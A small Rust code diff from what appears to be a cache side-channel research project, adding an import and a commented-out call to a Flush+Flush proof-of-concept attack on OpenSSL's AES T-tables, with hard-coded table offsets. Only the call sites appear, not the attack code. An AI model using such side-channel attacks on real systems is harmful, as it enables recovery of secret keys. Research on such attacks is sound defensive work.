@@ -3,7 +3,7 @@
 use aes_t_tables::SideChannelError::{AddressNotCalibrated, AddressNotReady};
 use aes_t_tables::{
     attack_t_tables_poc, AESTTableParams, CacheStatus, ChannelFatalError,
-    MultipleAddrCacheSideChannel, SideChannelError,
+    MultipleAddrCacheSideChannel, SideChannelError, SingleAddrCacheSideChannel,
 };
 use cache_utils::calibration::{
     get_cache_slicing, only_flush, CalibrateOperation2T, CalibrationOptions, HistParams, Verbosity,
@@ -396,7 +396,7 @@ fn main() {
                 openssl_path: &open_sslpath,
             },
         )
-    };
+    }; /**/
     let mut side_channel_ff = FlushAndFlush::new().unwrap();
     unsafe {
         attack_t_tables_poc(
@@ -409,4 +409,17 @@ fn main() {
             },
         )
     };
+    /*
+    let mut side_channel_ff = SingleFlushAndFlush::new().unwrap();
+    unsafe {
+        attack_t_tables_poc(
+            &mut side_channel_ff,
+            AESTTableParams {
+                num_encryptions: 1 << 15,
+                key: [0; 32],
+                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                openssl_path: &open_sslpath,
+            },
+        )
+    };*/
 }
